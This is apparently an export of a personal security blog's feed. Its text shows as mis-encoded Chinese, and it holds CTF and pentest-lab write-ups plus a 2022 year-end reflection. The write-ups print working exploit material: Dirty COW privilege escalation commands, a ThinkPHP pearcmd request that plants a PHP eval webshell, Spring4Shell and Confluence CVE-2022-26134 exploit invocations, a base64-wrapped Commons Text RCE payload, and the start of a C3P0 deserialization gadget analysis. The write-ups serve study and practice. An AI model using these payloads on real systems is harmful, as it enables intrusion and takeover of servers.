src="https://s1.ax1x.com/2023/03/02/ppFcFZd.png" alt="ppFcFZd.png"></a></p><p>è·å–åˆ°äº†ä¸€ä¸ªæ™®é€šç”¨æˆ·æƒé™</p><p><a href="https://imgse.com/i/ppFcVit"><img src="https://s1.ax1x.com/2023/03/02/ppFcVit.png" alt="ppFcVit.png"></a></p><h3 id="sshç™»é™†è¿æ¥"><a href="#sshç™»é™†è¿æ¥" class="headerlink" title="sshç™»é™†è¿æ¥"></a>sshç™»é™†è¿æ¥</h3><p><strong>ç”¨æˆ·å</strong></p><p>åœ¨&#x2F;homeç›®å½•ä¸‹æœ‰ä¸ªtiagoæ–‡ä»¶å¤¹ï¼Œä¸ºå…¶ç”¨æˆ·å</p><p><a href="https://imgse.com/i/ppAR2Of"><img src="https://s1.ax1x.com/2023/03/04/ppAR2Of.png" alt="ppAR2Of.png"></a></p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œç”¨python å¯åŠ¨ç»ˆç«¯ï¼Œè·å–ç”¨æˆ·åï¼Œå‰ææ˜¯ç›®æ ‡vmå¿…é¡»æœ‰python çš„ç¼–è¯‘ç¯å¢ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppARWm8"><img src="https://s1.ax1x.com/2023/03/04/ppARWm8.png" alt="ppARWm8.png"></a></p><p><strong>å¯†ç </strong></p><p>åœ¨<code>/var/www/html/sites/default/settings.php</code></p><p><a href="https://imgse.com/i/ppARf0S"><img src="https://s1.ax1x.com/2023/03/04/ppARf0S.png" alt="ppARf0S.png"></a></p><p>å°è¯•sshç™»å½•ï¼Œç™»é™†æˆåŠŸ</p><p><a href="https://imgse.com/i/ppAR5kQ"><img src="https://s1.ax1x.com/2023/03/04/ppAR5kQ.png" alt="ppAR5kQ.png"></a></p><p>ä½†æ˜¯è¿™ä¸ªè´¦æˆ·æ˜¯æ²¡æœ‰rootæƒé™çš„ï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥å°±æ˜¯</p><h3 id="è„ç‰›ææƒ"><a href="#è„ç‰›ææƒ" class="headerlink" title="è„ç‰›ææƒ"></a>è„ç‰›ææƒ</h3><p><strong>æ£€æŸ¥å†…æ ¸</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppARIYj"><img src="https://s1.ax1x.com/2023/03/04/ppARIYj.png" alt="ppARIYj.png"></a></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ä¸€ä¸ªå†…æ ¸ç‰ˆæœ¬æ˜¯<strong>4.4.0-31-generic</strong>ï¼Œè¿™ä¸ªç‰ˆæœ¬çš„å†…æ ¸æ˜¯è¿˜å­˜åœ¨è„ç‰›æ¼æ´çš„</p><p>åˆ©ç”¨<a href="https://codeload.github.com/mzet-/linux-exploit-suggester/zip/refs/heads/master">linux-exploit-suggester</a>è¿›è¡Œææƒcveæ¼æ´æ£€æµ‹</p><p>ä¸‹è½½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mzet-/linux-exploit-suggester</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ åˆ°ç›®æ ‡æœº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload linux-exploit-suggester /tmp</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppARHlq"><img src="https://s1.ax1x.com/2023/03/04/ppARHlq.png" alt="ppARHlq.png"></a></p><p>åˆ©ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux-exploit-suggester.sh</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppARb60"><img src="https://s1.ax1x.com/2023/03/04/ppARb60.png" alt="ppARb60.png"></a></p><p>è¿™é‡Œåˆ—å‡ºäº†å¾ˆå¤šæœ‰å¯èƒ½ç”¨äºææƒçš„cveï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©[CVE-2016-5195]dirty crow 40847</p><p><a href="https://imgse.com/i/ppARqXV"><img src="https://s1.ax1x.com/2023/03/04/ppARqXV.png" alt="ppARqXV.png"></a></p><p>åŒæ ·downä¸‹æ¥ä¸Šä¼ åˆ°ç›®æ ‡æœº</p><p><a href="https://imgse.com/i/ppAROmT"><img src="https://s1.ax1x.com/2023/03/04/ppAROmT.png" alt="ppAROmT.png"></a></p><p><code>c++</code> æ ¼å¼æ–‡ä»¶ï¼Œéœ€è¦å…ˆç¼–è¯‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o shell 40847.cpp -lutil</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘æˆåŠŸåä¼šç”Ÿæˆä¸€ä¸ªshellæ‰§è¡Œæ–‡ä»¶</p><p>æ‰§è¡Œdcowæ–‡ä»¶,è¿™é‡Œè¿˜éœ€æ³¨æ„éœ€è¦å…ˆè¿›å…¥ä¸€ä¸ªç”¨æˆ·æ‰èƒ½è¿›è¡Œææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./shell -s</span><br></pre></td></tr></table></figure><p>æˆåŠŸææƒ</p><p><a href="https://imgse.com/i/ppARX0U"><img src="https://s1.ax1x.com/2023/03/04/ppARX0U.png" alt="ppARX0U.png"></a></p><p>æ”¹rootè´¦æˆ·å¯†ç </p><p><a href="https://imgse.com/i/ppARxk4"><img src="https://s1.ax1x.com/2023/03/04/ppARxk4.png" alt="ppARxk4.png"></a></p><p>sshä»¥rootç”¨æˆ·ç™»å½•ï¼Œæ‹¿åˆ°flag</p><p><a href="https://imgse.com/i/ppARztJ"><img src="https://s1.ax1x.com/2023/03/04/ppARztJ.png" alt="ppARztJ.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€é¶æœºæµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023ç¬¬äº”å±Š Real World CTF ä½“éªŒèµ› Web</title>
      <link href="/2023/01/13/2023%E7%AC%AC%E4%BA%94%E5%B1%8A%20Real%20World%20CTF%20%E4%BD%93%E9%AA%8C%E8%B5%9B%20Web/"/>
      <url>/2023/01/13/2023%E7%AC%AC%E4%BA%94%E5%B1%8A%20Real%20World%20CTF%20%E4%BD%93%E9%AA%8C%E8%B5%9B%20Web/</url>
      
        <content type="html"><![CDATA[<h1 id="2023ç¬¬äº”å±Š-Real-World-CTF-ä½“éªŒèµ›-Web"><a href="#2023ç¬¬äº”å±Š-Real-World-CTF-ä½“éªŒèµ›-Web" class="headerlink" title="2023ç¬¬äº”å±Š Real World CTF ä½“éªŒèµ› Web"></a>2023ç¬¬äº”å±Š Real World CTF ä½“éªŒèµ› Web</h1><h2 id="Evil-MySQL-Server"><a href="#Evil-MySQL-Server" class="headerlink" title="Evil MySQL Server"></a>Evil MySQL Server</h2><p><a href="https://imgse.com/i/pS7duxx"><img src="https://s1.ax1x.com/2023/02/15/pS7duxx.md.png" alt="pS7duxx.md.png"></a></p><p>åˆ©ç”¨<a href="https://github.com/rmb122/rogue_mysql_server">rogue_mysql_server</a>æ„é€ æ¶æ„mysqlæœåŠ¡å™¨ä»¥ä»»æ„è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶</p><p>é…ç½®å¥½æ–‡ä»¶ï¼Œå¯åŠ¨æœåŠ¡å™¨ï¼Œå®¢æˆ·ç«¯è¿æ¥å¾—åˆ°flagæ–‡ä»¶åï¼Œæœ€åè¿›è¡Œè¯»å–</p><h2 id="Be-a-Language-Expert"><a href="#Be-a-Language-Expert" class="headerlink" title="Be-a-Language-Expert"></a>Be-a-Language-Expert</h2><p>è€ƒç‚¹ä¸º<code>thinkphp lang rce</code>ï¼Œä¹Ÿæ˜¯Thinkphpå¤šè¯­è¨€åŠŸèƒ½å¯¼è‡´çš„ä»»æ„æ–‡ä»¶åŒ…å«é—®é¢˜ï¼Œå…·ä½“ä¿¡æ¯å‚è€ƒ<a href="https://tttang.com/archive/1865/">Thinkphp å¤šè¯­è¨€ RCE - è·³è·³ç³– (tttang.com)</a></p><p>æ‰“å¼€é¢˜ç›®å‘ç°æ˜¯thinkphp6</p><p><a href="https://imgse.com/i/pS7dgWn"><img src="https://s1.ax1x.com/2023/02/15/pS7dgWn.md.png" alt="pS7dgWn.md.png"></a></p><p>å‚è€ƒpç‰›çš„<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">æ–‡ç« </a>ï¼Œåˆ©ç”¨PearCMDæ¥å®ç°æœ€ç»ˆrceï¼Œ</p><p>å‘é€è¯·æ±‚åŒ…ï¼Œè®²shell.phpå†™å…¥&#x2F;tmpç›®å½•ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /?+config-create+/&amp;lang=../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[0]);?&gt;+/tmp/shell.php HTTP/1.1</span><br><span class="line">Host: x.x.x.x:xxxx</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US;q=0.9,en;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›è¡Œæ–‡ä»¶åŒ…å«</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxxxx/index.php?lang=../../../../../../tmp/shell.php</span><br></pre></td></tr></table></figure><p>åå¼¹shellè·å¾—flag</p><h2 id="Spring4Shellï¼š"><a href="#Spring4Shellï¼š" class="headerlink" title="Spring4Shellï¼š"></a>Spring4Shellï¼š</h2><p><strong>CVE-2022-22965</strong></p><p>é¢˜ç›®å­˜åœ¨<code>.git</code>æ³„éœ²ï¼Œåˆ©ç”¨å·¥å…·æ¢å¤</p><p>æ­¤é¢˜éœ€è¦é€šè¿‡æ³„éœ²çš„ä¿¡æ¯ç¡®å®šshellçš„ä½ç½®ï¼Œå¯é€šè¿‡appBaseæ¥ç¡®å®šé¡¹ç›®è·¯å¾„</p><p>è·å–åˆ°webé¡¹ç›®è·¯å¾„<code>chaitin</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Host name=&quot;XXXX&quot;  appBase=&quot;chaitin&quot;</span><br></pre></td></tr></table></figure><p>å¯ç›´æ¥åˆ©ç”¨<a href="https://github.com/reznok/Spring4Shell-POC">Spring4ShellEXP</a>,é¡¹ç›®ä½ç½®éœ€è¦ä¿®æ”¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py --url http://xxxx/ --dir chaitin/ROOT</span><br></pre></td></tr></table></figure><h2 id="Be-a-Wiki-Hacker"><a href="#Be-a-Wiki-Hacker" class="headerlink" title="Be-a-Wiki-Hacker"></a>Be-a-Wiki-Hacker</h2><p>å‘ç°é¢˜ç›®<strong>Confluence</strong>ç‰ˆæœ¬ä¸º<strong>7.13.6</strong>ï¼Œæœç´¢å‘ç°<a href="https://blog.csdn.net/weixin_46944519/article/details/125141253">CVE-2022-26134 OGNLè¿œç¨‹ä»£ç æ‰§è¡Œ</a></p><p>ç›´æ¥åˆ©ç”¨GitHubè„šæœ¬rceå³å¯<a href="https://github.com/crowsec-edtech/CVE-2022-26134/">https://github.com/crowsec-edtech/CVE-2022-26134/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py -u http://xxxxx -c &quot;cat /flag&quot;</span><br></pre></td></tr></table></figure><h2 id="ApacheCommandText"><a href="#ApacheCommandText" class="headerlink" title="ApacheCommandText"></a>ApacheCommandText</h2><p>è¿‡æ»¤äº†å¾ˆå¤šå¸¸ç”¨åè®®,ä½†æ²¡æœ‰è¿‡æ»¤base64decoder,æ‰€ä»¥å¯ä»¥æŠŠç›´æ¥æŠŠpayloadè¿›è¡Œbase64åŠ å¯†å³å¯</p><p>æ„é€ å‘½ä»¤æ‰§è¡Œ<strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:JavaScript:var a=java.lang.Runtime.getRuntime().exec(&quot;/readflag&quot;);var b=a.getInputStream();var c=new java.io.BufferedReader(new java.io.InputStreamReader(b));c.readLine();&#125;</span><br></pre></td></tr></table></figure><p>base64åŠ å¯†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;base64decoder:JHtzY3JpcHQ6SmF2YVNjcmlwdDp2YXIgYT1qYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiL3JlYWRmbGFnIik7dmFyIGI9YS5nZXRJbnB1dFN0cmVhbSgpO3ZhciBjPW5ldyBqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKG5ldyBqYXZhLmlvLklucHV0U3RyZWFtUmVhZGVyKGIpKTtjLnJlYWRMaW5lKCk7fQ==&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pS70ejx"><img src="https://s1.ax1x.com/2023/02/15/pS70ejx.md.png" alt="pS70ejx.md.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> competition </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2022å¹´ç»ˆæ€»ç»“</title>
      <link href="/2022/12/31/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
      <url>/2022/12/31/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="2022å¹´ç»ˆæ€»ç»“"><a href="#2022å¹´ç»ˆæ€»ç»“" class="headerlink" title="2022å¹´ç»ˆæ€»ç»“"></a>2022å¹´ç»ˆæ€»ç»“</h1><p><strong>çƒŸç«å‘æ˜Ÿè¾°ï¼Œæ‰€æ„¿çš†æˆçœŸã€‚</strong></p><p>2022å¹´æ‚„ç„¶ç»“æŸï¼Œå›é¦–ä¸€å¹´çš„æ—¶å…‰ï¼Œç•™ä¸‹äº†ä¸¤ä¸ªæ¯”è¾ƒå¤§çš„é—æ†¾ã€‚</p><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>æ€»çš„æ¥è¯´ï¼Œä»Šå¹´çš„å­¦ä¹ è¿›åº¦è¿˜ç®—ä¸­è§„ä¸­çŸ©ï¼Œå­¦äº†ä¸€ä¸¢ä¸¢å°å°çš„å¼€å‘ï¼Œå…¶æ¬¡ï¼Œå¯¹pythonå’Œphpä¼šæ›´åŠ æ·±å…¥äº›äº†ï¼Œæœ€å¤§çš„æ”¶è·åº”è¯¥æ˜¯æ¥è§¦åˆ°äº†javaï¼Œjavaå®‰å…¨å§‹äºååºåˆ—åŒ–ï¼Œä¸ªäººæ„Ÿè§‰è¾ƒäºphpçš„ååºåˆ—åŒ–æ›´æœ‰æ„æ€ä¸€äº›ï¼Œä½†å…¥é—¨ä¹Ÿæ˜¯çœŸæ»´éš¾ï¼Œåœ¨è¢«æŠ˜ç£¨äº†ä¸€æ®µæ—¶é—´åï¼Œç»ˆäºç£•ç£•ç¢°ç¢°çš„å…¥äº†é—¨ã€‚</p><p>ä¸‹åŠå¹´å§ï¼Œä¸»è¦å°±æ˜¯åœ¨æ‰“æ¯”èµ›ï¼Œå¤ç°æ¯”èµ›ï¼Œå­¦ä¸€äº›æ–°ä¸œè¥¿ï¼Œåˆ°ä¹æœˆä»½åæœˆä»½å·¦å³ï¼Œå°±å¼€å§‹æ¥è§¦javaï¼Œä¹‹åå‡ ä¸ªæœˆä¹Ÿå·®ä¸å¤šï¼Œå°±æ–°å¢äº†ä¸ªå¯¹javaçš„å­¦ä¹ ã€‚</p><p>ä¸€æ•´å¹´ä¸‹æ¥ï¼Œæ¯”è¾ƒæ»¡æ„çš„è¿˜æ˜¯å¤§å¤§å°å°çš„æ¯”èµ›å‚åŠ çš„æŒºå¤šçš„(éš¾çš„æ—¶å€™åç‰¢ç¡®å®ä¹ŸæŒºæŠ˜ç£¨çš„~~)ï¼Œåƒä»€ä¹ˆå›½èµ›ï¼Œ0CTFï¼Œç½‘é¼æ¯ï¼ŒByteCTFï¼ŒHITCONâ€¦â€¦ï¼Œäº†è§£åˆ°å¾ˆå¤šå‰æ²¿çš„ä¸œè¥¿ï¼Œå“¦å¯¹äº†ï¼Œåœ¨2022å¹´å¼€å§‹æ¥è§¦åˆ°äº†å›½é™…èµ›ï¼Œç»™äººæ„Ÿå—ä¹Ÿæ˜¯é¢‡æ·±ï¼Œæ¶‰åŠåˆ°çš„çŸ¥è¯†éƒ½æ˜¯éå¸¸æ–°çš„ï¼Œå¾€å¾€æ˜¯æœ€æ–°çš„CVEæˆ–è€…ä¸€äº›trickï¼Œä»¥åŠä¸€äº›éå¸¸æœ‰è¶£çš„è®¾è®¡ï¼Œæœ€æœ€æœ€æœ€æœ€æœ€é‡è¦çš„æ˜¯â€”â€”å›½é™…èµ›å‡ ä¹é¢˜ç›®éƒ½ä¼šæä¾›dockerï¼ğŸ¤©</p><p>æœ€å¼€å¿ƒçš„ä»Šå¹´è®¤è¯†äº†å¥½å¤šå‰å®³çš„å¸ˆå‚…ï¼Œå¯ä»¥ç‹ ç‹ çš„å·å¸ˆäº†ğŸ˜</p><h2 id="Life"><a href="#Life" class="headerlink" title="Life"></a>Life</h2><p>ç”Ÿæ´»ä¸Šåˆ°æ²¡æœ‰ä»€ä¹ˆå¤§é£å¤§æµªï¼Œå…ˆæ˜¯å› ä¸ºç–«æƒ…åœ¨å®¶å¾…åˆ°å…«æœˆä»½æ‰å»å­¦æ ¡ï¼Œåˆ°å­¦æ ¡ååˆä¸€ç›´å°æ ¡ï¼Œå¯èƒ½æ¯”è¾ƒé—æ†¾çš„å°±æ˜¯æ²¡èƒ½å¥½å¥½å’Œæœ‹å‹å‡ºå»å­¦æ ¡èµ°èµ°ï¼Œç©ä¸€ç©ï¼Œå¹³å¹³æ·¡æ·¡çš„è¿‡äº†ä¸€æ•´å¹´ï¼Œå­¦æ ¡çš„è€ƒè¯•ä¹Ÿå…¨æ•°é¡ºåˆ©é€šè¿‡äº†ï¼Œå› ä¸ºæ¯”èµ›çº¿ä¸‹å»äº†å‡ ä¸ªåŸå¸‚ï¼Œä¸è¿‡å¤§éƒ¨åˆ†æ—¶é—´ä¹Ÿå‡ ä¹å°±æ˜¯åœ¨å®¾é¦†å’Œæ¯”èµ›åœºåœ°å¾…ç€ğŸ˜‹ã€‚å› ä¸ºç–«æƒ…ï¼Œæ„Ÿè§‰å°‘è®¤è¯†äº†å¥½å¤šäººï¼Œå°‘äº†å¥½å¤šå‡ºå»æºœè¾¾çš„æœºä¼šã€‚</p><h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p>1ã€æœ‰äº›è®¸æ‹–å»¶ç—‡ï¼Ÿ</p><p>2ã€åšå†³å®šæ—¶æ¯”è¾ƒå®¹æ˜“çŠ¹è±«ä¸å†³ï¼Œæ„Ÿè§‰æ— è®ºé€‰äº†å“ªä¸€ä¸ªéƒ½ä¼šåæ‚”æ²¡é€‰å¦ä¸€ä¸ªã€‚ã€‚ã€‚</p><p>3ã€åšäº‹æœ‰ç‚¹å®¹æ˜“åˆ†å¿ƒ</p><p>4ã€æœ‰ç‚¹æ€¥</p><h2 id="Expect"><a href="#Expect" class="headerlink" title="Expect"></a>Expect</h2><p>å¸Œæœ›å‘¢ï¼Œåœ¨2023å¹´èƒ½å¤Ÿå¥½å¥½é¢†ç•¥ä¸‹ç¥–å›½å¤§å¥½æ²³å±±(å°±æ˜¯èƒ½å¤šå‡ºå»èµ°èµ°çœ‹çœ‹~~)ï¼Œèƒ½å¤Ÿå¤šäº¤ä¸€äº›æœ‹å‹ï¼ŒæŠ€æœ¯ä¸Šèƒ½å¾—åˆ°è¾ƒå¤§æå‡ï¼Œæ·±å…¥å­¦ä¹ ä¸‹javaå®‰å…¨ï¼Œè¿˜æ˜¯æ¯”è¾ƒæœ‰æ„æ€ã€‚å­¦ä¹ nodejsï¼Œå¤šå‚åŠ ä¸€äº›æ¯”èµ›ï¼Œèƒ½åœ¨æ¯”è¾ƒå¤§çš„æ¯”èµ›ä¸Šå¤šåšå‡ºä¸€äº›é¢˜ï¼Œå¤šæ²‰æ·€æ²‰æ·€ï¼ŒæŠŠè‡ªå·±è¿˜æœ‰å‡ ä¸ªæ²¡æ•²å®šçš„äº‹å°½æ—©ç»™å†³å®šä¸‹æ¥ğŸ˜Š</p><p>ç¬¬ä¸€æ¬¡å†™æ€»ç»“ï¼Œä¹Ÿä¸çŸ¥é“è¦è¯´ä»€ä¹ˆäº†ï¼Œ2022å¹´å°±è¿™æ ·å’¯ï¼Œ2023å¹´ä¸ç•™é—æ†¾å°±å¥½äº†ï¼ŒåŠ æ²¹å§ï¼ï¼ï¼ğŸ¤ª</p><p>å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ~å—~~</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå®‰å…¨ä¹‹è·¯--C3P0é“¾</title>
      <link href="/2022/11/19/C3P0/"/>
      <url>/2022/11/19/C3P0/</url>
      
        <content type="html"><![CDATA[<h1 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h1><p>C3P0 æ˜¯ä¸€ä¸ªå¼€æºçš„ JDBC è¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’Œ JNDI ç»‘å®šï¼Œæ”¯æŒ JDBC3 è§„èŒƒå’Œ JDBC2 çš„æ ‡å‡†æ‰©å±•ã€‚ç›®å‰ä½¿ç”¨å®ƒçš„å¼€æºé¡¹ç›®æœ‰ Hibernateï¼ŒSpring ç­‰ã€‚ç®€å•æ¥è¯´ï¼ŒC3P0 å±äº jdbc çš„ä¸€éƒ¨åˆ†ã€‚</p><h2 id="ä¸€ã€ç¯å¢ƒæ­å»º"><a href="#ä¸€ã€ç¯å¢ƒæ­å»º" class="headerlink" title="ä¸€ã€ç¯å¢ƒæ­å»º"></a>ä¸€ã€ç¯å¢ƒæ­å»º</h2><p>æ–°å»ºä¸€ä¸ª<code>Maven</code>é¡¹ç›®ï¼Œåœ¨<code>pom.xml</code>ä¸­å¯¼å…¥<code>rome</code>ä¾èµ–</p><p><strong>pom.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="äºŒã€ååºåˆ—åŒ–Gadgets"><a href="#äºŒã€ååºåˆ—åŒ–Gadgets" class="headerlink" title="äºŒã€ååºåˆ—åŒ–Gadgets"></a>äºŒã€ååºåˆ—åŒ–Gadgets</h2><p>C3P0æœ‰ä¸‰æ¡Gadget</p><p>â€¢ URLClassLoader è¿œç¨‹ç±»åŠ è½½</p><p>â€¢ JNDI æ³¨å…¥</p><p>â€¢ åˆ©ç”¨ HEX åºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨è¿›è¡Œååºåˆ—åŒ–æ”»å‡»</p><h2 id="ä¸‰ã€åˆ©ç”¨é“¾åˆ†ææ„é€ "><a href="#ä¸‰ã€åˆ©ç”¨é“¾åˆ†ææ„é€ " class="headerlink" title="ä¸‰ã€åˆ©ç”¨é“¾åˆ†ææ„é€ "></a>ä¸‰ã€åˆ©ç”¨é“¾åˆ†ææ„é€ </h2><h3 id="URLClassLoaderé“¾"><a href="#URLClassLoaderé“¾" class="headerlink" title="URLClassLoaderé“¾"></a>URLClassLoaderé“¾</h3><h4 id="gadgetæµç¨‹åˆ†æ"><a href="#gadgetæµç¨‹åˆ†æ" class="headerlink" title="gadgetæµç¨‹åˆ†æ"></a>gadgetæµç¨‹åˆ†æ</h4><p>æ—¢ç„¶æ˜¯åˆ©ç”¨ä¸ClassLoaderç›¸å…³çš„é“¾å­ï¼Œé‚£ä¹ˆæœ€åå¤§æ¦‚ç‡æ˜¯åŠ¨æ€åŠ è½½æ¶æ„å­—èŠ‚ç å¯¼è‡´rce</p><p>è¯¥åˆ©ç”¨é“¾æœ€ç»ˆèƒ½è¿›è¡Œä»»æ„è¿œç¨‹ç±»åŠ è½½</p><p>é“¾å°¾:<code>ReferenceableUtils.referenceToObject()</code></p><p>å…¶ä¸­è°ƒç”¨äº† URLClassLoader åŠ è½½ç±»çš„æ–¹æ³•ï¼ŒåŒæ—¶è¿˜è¿›è¡Œäº†ç±»çš„åŠ è½½</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211171341849.png" alt="image-20221117134119815"></p><p>å¾€ä¸Šæ‰¾ï¼Œåœ¨<code>ReferenceIndirector.java</code>ä¸­<code>ReferenceSerialized.getObject()</code> è°ƒç”¨äº†<code>ReferenceableUtils.referenceToObject()</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211171332256.png" alt="image-20221117133230218"></p><p>ç»§ç»­å¾€ä¸Šæ‰¾ï¼Œ<code>PoolBackedDataSourceBase.readObject() </code>è°ƒç”¨äº† <code>ReferenceSerialized.getObject()</code>,åŒæ—¶æ­£å¥½<code>PoolBackedDataSourceBase.readObject()</code>å¯ä»¥ä½œä¸ºååºåˆ—åŒ–çš„å…¥å£</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211171336399.png" alt="image-20221117133646366"></p><p>å…¶ä¸­<code>IndirectlySerialized</code>æ˜¯ä¸ªæ¥å£ç±»ï¼ŒåŒæ—¶<code>ReferenceIndirector</code>ç»§æ‰¿äº†è¿™ä¸ªæ¥å£</p><p><strong>Gadget</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PoolBackedDataSourceBase.readObject()</span><br><span class="line">ReferenceSerialized.getObject()</span><br><span class="line">ReferenceableUtils.referenceToObject()</span><br><span class="line">ObjectFactory.getObjectInstance()</span><br><span class="line">URLClassLoader åŠ¨æ€åŠ è½½æ¶æ„å­—èŠ‚ç </span><br></pre></td></tr></table></figure><h4 id="Expç¼–å†™"><a href="#Expç¼–å†™" class="headerlink" title="Expç¼–å†™"></a>Expç¼–å†™</h4><p>å…ˆå†™ä¸ª<code>ReferenceableUtils.referenceToObject()</code>çš„<code>URLClassLoader</code>åŠ è½½æ¶æ„ç±»çš„expå…œåº•</p><p><strong>Exp1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title 